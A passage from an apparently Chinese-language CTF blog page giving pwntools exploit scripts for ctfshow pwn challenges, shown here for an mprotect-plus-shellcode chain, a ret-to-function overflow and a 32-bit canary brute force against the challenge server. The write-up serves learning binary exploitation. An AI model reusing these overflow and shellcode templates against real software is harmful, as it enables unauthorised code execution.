<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"maple-pwn.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.23.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="ctfshow pwn题解（部分）read的系统调用号为0x3,execve的系统调用号为0xb49 mprotect（32）一个mprotect的题，主要是记一下模板 1234567891011121314151617181920212223242526from pwn import *from LibcSearcher import LibcSearcherfrom ctypes import">
<meta property="og:type" content="article">
<meta property="og:title" content="Maple">
<meta property="og:url" content="http://maple-pwn.github.io/2025/04/04/ctfshow/wp/index.html">
<meta property="og:site_name" content="Maple">
<meta property="og:description" content="ctfshow pwn题解（部分）read的系统调用号为0x3,execve的系统调用号为0xb49 mprotect（32）一个mprotect的题，主要是记一下模板 1234567891011121314151617181920212223242526from pwn import *from LibcSearcher import LibcSearcherfrom ctypes import">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2025-04-03T17:34:36.970Z">
<meta property="article:modified_time" content="2025-03-19T04:50:31.015Z">
<meta property="article:author" content="Maple">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://maple-pwn.github.io/2025/04/04/ctfshow/wp/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://maple-pwn.github.io/2025/04/04/ctfshow/wp/","path":"2025/04/04/ctfshow/wp/","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title> | Maple</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  






  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Maple</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">Maple’s Blog</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>







</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ctfshow-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">ctfshow pwn题解（部分）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#read%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B7%E4%B8%BA0x3-execve%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B7%E4%B8%BA0xb"><span class="nav-number">1.1.</span> <span class="nav-text">read的系统调用号为0x3,execve的系统调用号为0xb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#49-mprotect%EF%BC%8832%EF%BC%89"><span class="nav-number">1.2.</span> <span class="nav-text">49 mprotect（32）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#52-%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%EF%BC%8832%EF%BC%89"><span class="nav-number">1.3.</span> <span class="nav-text">52 函数传参（32）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#53-32%E4%BD%8Dcanary%E7%88%86%E7%A0%B4"><span class="nav-number">1.4.</span> <span class="nav-text">53 32位canary爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#54-puts%E9%81%87%E8%A7%81%E2%80%99-x00%E2%80%99%E6%88%AA%E6%96%AD%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%A1%AB%E5%85%85%E6%BB%A1%E5%AF%BC%E8%87%B4%E5%90%8E%E7%BB%AD%E5%86%85%E5%AE%B9%E6%BA%A2%E5%87%BA"><span class="nav-number">1.5.</span> <span class="nav-text">54 puts遇见’\x00’截断，可以填充满导致后续内容溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#61-leave-ret%E6%8C%87%E4%BB%A4%E4%BC%9A%E5%AF%B9shellcode%E4%BA%A7%E7%94%9F%E5%BD%B1%E5%93%8D%EF%BC%8C%E6%B3%A8%E6%84%8F%E8%BE%93%E5%85%A5%E7%9A%84%E5%90%8E%E9%9D%A2%E6%98%AF%E5%90%A6%E6%9C%89%E8%AF%A5%E6%8C%87%E4%BB%A4"><span class="nav-number">1.6.</span> <span class="nav-text">61 leave_ret指令会对shellcode产生影响，注意输入的后面是否有该指令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%89PIE%EF%BC%8C%E6%A0%88%E5%8F%AF%E6%89%A7%E8%A1%8C%EF%BC%8C%E6%9C%89RWX"><span class="nav-number">1.6.0.1.</span> <span class="nav-text">有PIE，栈可执行，有RWX</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#66-x00%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">1.7.</span> <span class="nav-text">66 \x00绕过字符串</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#68-nop-sled-64bit"><span class="nav-number">1.8.</span> <span class="nav-text">68 nop sled(64bit)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%89Canary%EF%BC%8C%E6%97%A0PIE%EF%BC%8C%E6%A0%88%E5%8F%AF%E6%89%A7%E8%A1%8C%EF%BC%8C%E6%9C%89RWX-%E7%BB%95%E8%BF%87%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E4%BD%8D%E7%BD%AE"><span class="nav-number">1.8.0.1.</span> <span class="nav-text">有Canary，无PIE，栈可执行，有RWX,绕过随机数生成的缓冲区位置</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#69-ORW%E7%9A%84%E6%9D%BF%E5%AD%90"><span class="nav-number">1.9.</span> <span class="nav-text">69 ORW的板子</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%97%A0Canary%EF%BC%8C%E6%97%A0PIE%EF%BC%8C%E6%9C%89RWX%EF%BC%8C%E6%A0%88%E5%8F%AF%E6%89%A7%E8%A1%8C"><span class="nav-number">1.9.0.1.</span> <span class="nav-text">无Canary，无PIE，有RWX，栈可执行</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#70-ORW%E7%9A%84%E6%B1%87%E7%BC%96%E6%9D%BF%E5%AD%90"><span class="nav-number">1.10.</span> <span class="nav-text">70 ORW的汇编板子</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%89Canary%EF%BC%8C%E6%97%A0PIE%EF%BC%8C%E6%A0%88%E5%8F%AF%E6%89%A7%E8%A1%8C%EF%BC%8C%E6%9C%89RWX%EF%BC%8C%E6%B2%99%E7%9B%92%E4%BF%9D%E6%8A%A4"><span class="nav-number">1.10.0.1.</span> <span class="nav-text">有Canary，无PIE，栈可执行，有RWX，沙盒保护</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#71-ret2syscall-32bit-%E6%9D%BF%E5%AD%90"><span class="nav-number">1.11.</span> <span class="nav-text">71 ret2syscall(32bit)板子</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#NX%E5%BC%80%E5%90%AF%EF%BC%8C%E6%97%A0PIE"><span class="nav-number">1.11.0.1.</span> <span class="nav-text">NX开启，无PIE</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#72-ret2syscall-32bit-%E6%97%A0-bin-sh-%E6%9D%BF%E5%AD%90"><span class="nav-number">1.12.</span> <span class="nav-text">72 ret2syscall(32bit,无&#x2F;bin&#x2F;sh)板子</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#NX%E4%BF%9D%E6%8A%A4%E5%BC%80%E5%90%AF%EF%BC%8C%E6%97%A0PIE"><span class="nav-number">1.12.0.1.</span> <span class="nav-text">NX保护开启，无PIE</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#75-%E6%A0%88%E8%BF%81%E7%A7%BB%EF%BC%8832%E4%BD%8D%EF%BC%89"><span class="nav-number">1.13.</span> <span class="nav-text">75 栈迁移（32位）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%AF%E4%BB%A5%E6%B3%84%E9%9C%B2ebp"><span class="nav-number">1.13.0.1.</span> <span class="nav-text">可以泄露ebp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#76-base64%E8%A7%A3%E7%A0%81"><span class="nav-number">1.14.</span> <span class="nav-text">76 base64解码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#78-ret2syscall-64"><span class="nav-number">1.15.</span> <span class="nav-text">78 ret2syscall(64)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#79-ret2reg-32%E4%BD%8D-call-rax%E6%88%96jmp-reg%E6%8C%9F%E6%8C%81%E8%B5%B0%E5%90%91"><span class="nav-number">1.16.</span> <span class="nav-text">79 ret2reg(32位) call rax或jmp reg挟持走向</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%88%E5%8F%AF%E6%89%A7%E8%A1%8C"><span class="nav-number">1.16.0.1.</span> <span class="nav-text">栈可执行</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#82-%E9%AB%98%E7%BA%A7ROP-NO-RELRO%EF%BC%8832%EF%BC%89ret2dlresolve-%EF%BC%88%E9%80%82%E7%94%A8%E4%BA%8E%E6%97%A0%E5%9F%BA%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2%EF%BC%89"><span class="nav-number">1.17.</span> <span class="nav-text">82 高级ROP NO_RELRO（32）ret2dlresolve （适用于无基地址泄露）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#83-Partial-RELRO-32-ret2dlresolve"><span class="nav-number">1.18.</span> <span class="nav-text">83 Partial_RELRO(32)ret2dlresolve</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#84-NO-RELRO%EF%BC%8864%EF%BC%89ret2dlresolve"><span class="nav-number">1.19.</span> <span class="nav-text">84 NO_RELRO（64）ret2dlresolve</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#85-Parti-RELRO%EF%BC%8864%EF%BC%89ret2dlresolve"><span class="nav-number">1.20.</span> <span class="nav-text">85 Parti_RELRO（64）ret2dlresolve</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#86-SROP-64"><span class="nav-number">1.21.</span> <span class="nav-text">86 SROP 64</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%A2%E5%87%BA%E6%83%B3%E6%9E%84%E9%80%A0ROP%E9%93%BE%E7%9A%84%E8%AF%9D%EF%BC%8C%E6%B2%A1%E6%9C%89%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%EF%BC%8C%E6%9C%AC%E8%BA%AB%E7%A8%8B%E5%BA%8Fgadget%E5%B0%91%E5%BE%97%E5%8F%AF%E6%80%9C%EF%BC%8Cgadget%E4%B8%8D%E8%B6%B3%EF%BC%8C%E6%83%B3ret2syscall%E7%9A%84%E8%AF%9D%EF%BC%8Csyscall%E7%9A%84%E5%8F%82%E6%95%B0rax%E5%BE%97%E6%98%AF59%EF%BC%8Crdi%E5%BE%97%E6%98%AF-bin-sh%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%8Crsi%E5%92%8Crdx%E5%BE%97%E4%B8%BA%E9%9B%B6%EF%BC%8C%E4%BD%86%E7%9B%B8%E5%85%B3pop%E7%9A%84gadget%E9%83%BD%E6%B2%A1%E6%9C%89"><span class="nav-number">1.21.0.1.</span> <span class="nav-text">溢出想构造ROP链的话，没有动态链接库，本身程序gadget少得可怜，gadget不足，想ret2syscall的话，syscall的参数rax得是59，rdi得是&#x2F;bin&#x2F;sh的地址，rsi和rdx得为零，但相关pop的gadget都没有</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#87-stack-pivoting-64"><span class="nav-number">1.22.</span> <span class="nav-text">87 stack pivoting 64</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%AF%E6%8E%A7%E5%88%B6%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%97%E8%8A%82%E6%95%B0%E8%BE%83%E5%B0%91%EF%BC%9B%E5%BC%80%E5%90%AF%E4%BA%86PIE%E4%BF%9D%E6%8A%A4%EF%BC%8C%E6%A0%88%E5%9C%B0%E5%9D%80%E6%9C%AA%E7%9F%A5%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%B0%86%E6%A0%88%E5%8A%AB%E6%8C%81%E5%88%B0%E5%B7%B2%E7%9F%A5%E7%9A%84%E5%8C%BA%E5%9F%9F%EF%BC%9B%E5%85%B6%E5%AE%83%E6%BC%8F%E6%B4%9E%E9%9A%BE%E4%BB%A5%E5%88%A9%E7%94%A8%EF%BC%8C%E5%8A%AB%E6%8C%81%E6%A0%88%E5%88%B0%E5%A0%86%E7%A9%BA%E9%97%B4%EF%BC%8C%E4%BB%8E%E8%80%8C%E5%9C%A8%E5%A0%86%E4%B8%8A%E5%86%99ROP%E4%BB%A5%E5%8F%8A%E8%BF%9B%E8%A1%8C%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.22.0.1.</span> <span class="nav-text">可控制的栈溢出字节数较少；开启了PIE保护，栈地址未知，我们可以将栈劫持到已知的区域；其它漏洞难以利用，劫持栈到堆空间，从而在堆上写ROP以及进行堆漏洞利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%AF%E4%BB%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81%EF%BC%9B%E5%8F%AF%E4%BB%A5%E6%8E%A7%E5%88%B6rsp%E6%8C%87%E9%92%88"><span class="nav-number">1.22.0.2.</span> <span class="nav-text">可以控制程序执行流；可以控制rsp指针</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#88-frame-faking"><span class="nav-number">1.23.</span> <span class="nav-text">88 frame faking</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#89-%E8%8A%B1%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="nav-number">1.24.</span> <span class="nav-text">89 花栈溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#94-fmtstr%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="nav-number">1.25.</span> <span class="nav-text">94 fmtstr实现任意地址写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#95-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E4%BD%8D%E7%BD%AE%E8%AF%BB"><span class="nav-number">1.26.</span> <span class="nav-text">95 格式化字符串实现任意位置读</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#96-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6"><span class="nav-number">1.27.</span> <span class="nav-text">96 格式化字符串泄露内存中的字符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#99-flag%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E7%9B%B2%E6%89%93"><span class="nav-number">1.28.</span> <span class="nav-text">99 flag在栈上的盲打</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#100-%E4%B8%80%E6%AC%A1%E6%80%A7%E6%94%B9%E5%86%99%E5%A4%9A%E4%B8%AA%E5%80%BC"><span class="nav-number">1.29.</span> <span class="nav-text">100 一次性改写多个值</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#105-unsigned-int8%E7%9A%84%E8%BD%AE%E5%9B%9E"><span class="nav-number">1.30.</span> <span class="nav-text">105 unsigned_int8的轮回</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Maple</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">44</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/ctfshow/wp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Maple">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Maple">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | Maple">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-04-04 01:34:36" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:36+08:00">2025-04-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-03-19 12:50:31" itemprop="dateModified" datetime="2025-03-19T12:50:31+08:00">2025-03-19</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="ctfshow-pwn题解（部分）"><a href="#ctfshow-pwn题解（部分）" class="headerlink" title="ctfshow pwn题解（部分）"></a>ctfshow pwn题解（部分）</h1><h2 id="read的系统调用号为0x3-execve的系统调用号为0xb"><a href="#read的系统调用号为0x3-execve的系统调用号为0xb" class="headerlink" title="read的系统调用号为0x3,execve的系统调用号为0xb"></a>read的系统调用号为0x3,execve的系统调用号为0xb</h2><h2 id="49-mprotect（32）"><a href="#49-mprotect（32）" class="headerlink" title="49 mprotect（32）"></a>49 mprotect（32）</h2><p>一个<code>mprotect</code>的题，主要是记一下模板</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">mprotect  = elf.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">addr = <span class="number">0x80DA000</span></span><br><span class="line">size = <span class="number">0x1000</span></span><br><span class="line">proc = <span class="number">0x7</span></span><br><span class="line">pop_ebx_esi_ebp_ret = <span class="number">0x80a019b</span></span><br><span class="line">read = elf.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x12</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(mprotect)</span><br><span class="line">payload+=p32(pop_ebx_esi_ebp_ret)+p32(addr)+p32(size)+p32(proc)</span><br><span class="line">payload+=p32(read)</span><br><span class="line">payload+=p32(pop_ebx_esi_ebp_ret)+p32(<span class="number">0</span>)+p32(addr)+p32(size)+p32(addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="52-函数传参（32）"><a href="#52-函数传参（32）" class="headerlink" title="52 函数传参（32）"></a>52 函数传参（32）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28294</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">flag = <span class="number">0x8048586</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x6C</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(flag)+p32(<span class="number">0</span>)+p32(<span class="number">876</span>)+p32(<span class="number">877</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="53-32位canary爆破"><a href="#53-32位canary爆破" class="headerlink" title="53 32位canary爆破"></a>53 32位canary爆破</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;critical&#x27;</span></span><br><span class="line">canary = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xFF</span>):</span><br><span class="line">        <span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">        io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28248</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + canary + p8(c)</span><br><span class="line">        io.sendafter(<span class="string">&#x27;$ &#x27;</span>,payload)</span><br><span class="line">        io.recv(<span class="number">1</span>)</span><br><span class="line">        ans = io.recv()</span><br><span class="line">        <span class="built_in">print</span> (ans)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;Canary Value Incorrect!&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> ans:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;The index(&#123;&#125;),value(&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(i,c))</span><br><span class="line">            canary += p8(c)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;tring... ...&#x27;</span>)</span><br><span class="line">        io.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28248</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag = elf.sym[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + canary + p32(<span class="number">0</span>)*<span class="number">4</span> + p32(flag)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">&#x27;$ &#x27;</span>,payload)</span><br><span 